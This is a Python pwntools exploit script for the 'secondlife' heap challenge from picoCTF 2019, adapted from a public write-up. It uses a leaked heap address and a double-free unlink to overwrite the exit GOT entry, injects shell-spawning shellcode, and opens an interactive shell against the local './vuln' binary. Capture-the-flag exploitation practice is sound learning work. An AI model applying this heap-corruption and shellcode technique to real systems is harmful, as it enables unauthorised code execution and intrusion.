#!/usr/bin/env python3

"""
NOTE:
    - modifed version of: https://tcode2k16.github.io/blog/posts/picoctf-2019-writeup/binary-exploitation/#secondlife
    - Ubuntu 18.04
    - 32 bit -> pointers are 4 bytes, min chunk sizes and alignment is different (min 16 bytes, alignment 8 bytes)
    - heap/stack must be executable to execute code injected into the heap
    - there is a win() function but we inject our own shellcode in this example
"""

from pwn import *
import sys

context.log_level = "debug"
context.terminal = ["tmux", "split", "-h"]


def main():
    sh = process("./vuln")
    # sh = gdb.debug("./vuln", gdbscript="""b *0x08048B10
    # continue
    # """
    # )
    _ = sh.recvline()

    """
      Ghidra:
      __s = (char *)malloc(0x100);
      puts("Oops! a new developer copy pasted and printed an address as a decimal...");
      printf("%d\n",__s);

      -> leak into the heap; more concrete leak to the chunk that will be double freed!
    """
    leak = int(sh.recvline())

    sh.sendline(b"abcde")

    """
    $ objdump --dynamic-reloc vuln | grep exit
    0804d02c R_386_JUMP_SLOT   exit@GLIBC_2.0
    """
    exit_got = 0x0804D02C

    """
    FD->bk = BK == FD + 12 = BK -> (exit_got - 12) + 12 := shellcode 
    BK->fd = FD == BK + 8 = FD  -> BK is where our shellcode starts, BK + 8 will be overwritten :( We need to fix this with a jmp!
    """
    payload = p32(exit_got - 12)
    payload += p32(leak + 8)  # +8 so that we skip FD and BK pointer writes

    """
    0       2  4    8  16                    <- byte offsets
    |jmp sc|AA|AAAA|FD|the real shellcode    <- FD will be written because of BK + 8 = FD; A bytes are filler bytes.. can be nops or As
    ^
    |_ shellcode starts here / heap leak
    """
    payload += asm(
        """
      jmp sc
      {}
    sc:
      """.format(
            "nop\n" * (2 + 8 + 1) # add 2 bytes to 2-byte jmp instruction; 8 bytes for fd and bk (bk will be overwritten by unlink macro); 1 byte compensation for alignment
        )
        + shellcraft.i386.linux.sh()
    )

    print(enhex(payload))

    assert len(payload) <= 256

    payload = payload.ljust(256)

    sh.sendlineafter(b"...\n", payload)

    sh.interactive()


if __name__ == "__main__":
    main()
